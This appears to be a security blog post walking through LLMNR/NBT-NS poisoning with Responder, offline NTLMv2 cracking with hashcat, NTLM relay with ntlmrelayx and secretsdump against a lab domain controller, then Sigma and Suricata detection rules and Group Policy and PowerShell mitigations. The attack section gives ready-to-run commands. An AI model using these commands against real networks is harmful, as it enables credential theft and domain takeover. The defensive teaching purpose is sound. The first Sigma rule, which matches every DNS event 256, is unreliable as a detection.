---
title: "LLMNR Poisoning to Domain Compromise"
date: 2026-05-01
categories: [Active Directory, Detection]
tags: [LLMNR, NBNS, Responder, NTLM, Relay, Detection]
author: Wizard
toc: true
comments: true
description: "A complete walkthrough of LLMNR/NBNS poisoning attacks — from initial credential capture to domain compromise — with Sigma detection rules."
---

LLMNR and NBT-NS poisoning are among the most reliable techniques for capturing credentials on internal networks. Despite being well-documented, these protocols remain enabled in a large percentage of enterprise environments. This post walks through the full attack chain from initial capture to domain administrator access, then covers detection and remediation.

## What is LLMNR?

**Link-Local Multicast Name Resolution (LLMNR)** is a protocol that allows hosts on the same local link to resolve each other's names. It is used as a fallback when DNS resolution fails. When a Windows host fails to resolve a name via DNS, it broadcasts an LLMNR query to the entire local subnet.

**NetBIOS Name Service (NBT-NS)** serves a similar function — it is an older broadcast-based name resolution protocol.

Both protocols are enabled by default on Windows and can be exploited by any host on the same network segment.

<div class="callout callout-warning">
<strong>Warning</strong>
LLMNR and NBT-NS attacks require the attacker to be on the same network segment as the victim. They are ineffective across routed network boundaries.
</div>

## The Attack Chain

### Step 1 — Name Resolution Failure

The attack is triggered when a user or process attempts to resolve a name that does not exist in DNS. Common triggers include:

- Mistyped UNC paths (`\\fileserve\share` instead of `\\fileserver\share`)
- Stale mapped drives
- Applications attempting to reach non-existent hosts
- Browser or shortcut accessing old file paths

When DNS fails, Windows falls back to LLMNR, broadcasting to the local subnet: *"Does anyone know the IP address of `fileserve`?"*

### Step 2 — Poisoning with Responder

**Responder** listens for these broadcast queries and responds to every request, claiming to be the target host.

```bash
# Start Responder on the target network interface
sudo responder -I eth0 -rdw
```

Key Responder flags:
- `-I eth0` — network interface
- `-r` — enable rogue WPAD server
- `-d` — enable DHCP poisoning
- `-w` — enable WPAD proxy

When a victim connects to our rogue host, Windows automatically attempts to authenticate using the currently logged-on user's credentials — sending an NTLMv2 hash.

### Step 3 — Capturing NTLMv2 Hashes

Responder captures the hash and displays it in the console:

```
[SMB] NTLMv2-SSP Client   : 10.10.1.50
[SMB] NTLMv2-SSP Username : CORP\jdoe
[SMB] NTLMv2-SSP Hash     : jdoe::CORP:ab12cd34...:0101000000000000...
```

NTLMv2 hashes **cannot be passed directly** (unlike NTLMv1), but they can be:

1. Cracked offline with hashcat
2. Relayed to other hosts using `ntlmrelayx`

### Step 4a — Cracking with Hashcat

```bash
# Mode 5600 = NTLMv2
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
```

If the password is in a wordlist or derivable from rules, you'll have cleartext credentials.

### Step 4b — NTLM Relay Attack

When cracking is not feasible (strong password), relay the hash instead. The key requirement: **SMB signing must be disabled on the target**.

```bash
# Check SMB signing across the network
nmap --script smb2-security-mode.nse -p445 10.10.1.0/24

# Start ntlmrelayx targeting a host without SMB signing
ntlmrelayx.py -t 10.10.1.100 -smb2support -i
```

With an interactive shell on the relayed target, you can dump the SAM database, extract credentials, and move laterally.

### Step 5 — Privilege Escalation

If the relay lands on a domain controller or a host where a DA has an active session, the attack can escalate directly to domain admin:

```bash
# Relay with --no-http-server for SMB-only relay
# Target: domain controller
ntlmrelayx.py -t smb://10.10.1.10 -smb2support --no-http-server

# Dump domain hashes via secretsdump
secretsdump.py CORP/jdoe:Password1@10.10.1.10
```

## Detection

### Windows Event Log Detection

<div class="callout callout-detection">
<strong>Detection</strong>
The most reliable indicator is anomalous NTLM authentication from hosts that should not be authenticating to each other — especially to unknown or rogue SMB servers.
</div>

Key Windows events to monitor:

| Event ID | Description | Channel |
|---|---|---|
| 4648 | Logon attempt with explicit credentials | Security |
| 4624 | Successful logon (Type 3 = network) | Security |
| 5140 | Network share access | Security |
| 3 | Network connection (Sysmon) | Microsoft-Windows-Sysmon/Operational |

### Sigma Rules

**Detecting Responder activity (LLMNR answer from unexpected host):**

```yaml
title: LLMNR Response from Unexpected Host
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects LLMNR responses from hosts not in the expected resolver list
logsource:
    product: windows
    service: dns-server
detection:
    selection:
        EventID: 256
    condition: selection
falsepositives:
    - Legitimate DNS servers
level: medium
tags:
    - attack.credential_access
    - attack.t1557.001
```

**Detecting NTLMv2 capture attempts:**

```yaml
title: NTLMv2 Capture - Suspicious SMB Authentication
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects NTLM authentication to unusual internal hosts, possible credential capture
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
    filter:
        SubjectUserName|endswith: '$'
    condition: selection and not filter
falsepositives:
    - Legacy applications using NTLM
level: medium
tags:
    - attack.credential_access
    - attack.t1557.001
```

### Network Detection (Suricata)

```yaml
alert udp any any -> any 5355 (
  msg:"LLMNR Query - Potential Poisoning Target";
  content:"|00 00 01 00 00 01 00 00 00 00 00 00|";
  offset:2;
  depth:12;
  sid:9001001;
  rev:1;
)
```

## Mitigation

<div class="callout callout-mitigation">
<strong>Mitigation</strong>
Disabling LLMNR and NBT-NS eliminates this attack vector entirely. This is the recommended remediation.
</div>

### Disable LLMNR via Group Policy

```
Computer Configuration
  → Administrative Templates
    → Network
      → DNS Client
        → Turn off multicast name resolution
          → Enabled
```

### Disable NBT-NS via Registry / PowerShell

```powershell
# Disable NBT-NS on all adapters
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration
foreach ($adapter in $adapters) {
    if ($adapter.TcpipNetbiosOptions -ne $null) {
        $adapter.SetTcpipNetbios(2)  # 2 = Disable NetBIOS
    }
}
```

### Enable SMB Signing

Enabling SMB signing on all hosts prevents relay attacks even if hashes are captured:

```powershell
# Enable SMB signing (required, not just enabled)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
```

## Summary

LLMNR/NBT-NS poisoning remains one of the most effective attacks in an internal network assessment. The attack chain from broadcast capture to domain compromise can execute in minutes on an unprotected network.

Key takeaways:

1. **Disable LLMNR and NBT-NS** — this is the only real fix
2. **Enable SMB signing** everywhere to block relay attacks
3. **Monitor NTLM authentication** to unexpected hosts
4. **Enforce strong passwords** to resist offline cracking

<div class="callout callout-ioc">
<strong>IOC</strong>
10.10.1.99 — Responder C2 in lab environment (demo only)<br>
Hash: jdoe::CORP:ab12cd34ef56ab12:... (demo)
</div>
